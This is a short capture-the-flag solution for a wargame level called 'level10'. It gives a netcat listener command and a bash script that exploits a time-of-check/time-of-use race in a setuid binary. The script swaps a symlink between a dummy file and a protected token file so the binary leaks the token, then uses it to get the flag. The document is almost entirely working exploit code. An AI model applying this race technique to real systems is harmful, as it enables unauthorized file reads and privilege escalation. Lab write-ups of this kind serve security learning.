# Get nc server up
`while true;  do nc -l 6969 | grep -v '.*( )*.' ; done`

# Run this script to exploit unsecure access function by quickly swapping files
```bash
#!/bin/bash

random_file=$(head -c 500 /dev/urandom | tr -dc 'a-zA-Z0-9~!@#$%^&*_-' | fold -w 25 | head -n 1)

touch /tmp/$random_file

link_name=$(head -c 500 /dev/urandom | tr -dc 'a-zA-Z0-9~!@#$%^&*_-' | fold -w 25 | head -n 1)

while true
do
        /home/user/level10/level10 /tmp/$link_name 127.0.1 &> /dev/null
done &

while true
do
        ln -fs /home/user/level10/token /tmp/$link_name
        ln -fs /tmp/$random_file /tmp/$link_name
done
```

# Get the flag
```bash
su flag10
getflag
```
